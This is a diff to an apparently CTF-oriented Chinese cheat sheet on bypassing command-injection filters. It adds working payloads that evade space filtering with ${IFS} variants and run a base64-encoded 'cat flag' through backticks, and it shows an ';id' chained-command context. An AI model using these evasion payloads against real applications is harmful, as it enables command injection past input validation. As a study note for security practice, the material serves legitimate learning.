@@ -27,13 +27,24 @@ echo 繺;id
 
 # 空格过滤
 ## 法一： ${IFS}
+payload1:
 ```
 ubuntu@VM-207-93-ubuntu:~$ cat flag
 nice day
 ubuntu@VM-207-93-ubuntu:~$ cat${IFS}flag
 nice day
 ```
+payload2:
+```
+ubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flag
+nice day
+```
+payload3:
+```
+ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag
+nice day
 
+```
 ## 法二： 重定向符<>
 payload1：
 ```
@@ -54,6 +65,11 @@ nice day
 ```
 ## 法二： 利用已存在的资源
 从已有的文件或者环境变量中获得相应的字符。
+## 法三： base64编码
+``
+ubuntu@VM-207-93-ubuntu:~$ `echo "Y2F0IGZsYWc="|base64 -d`
+nice day
+```
 
 # 工具
 + [shelling
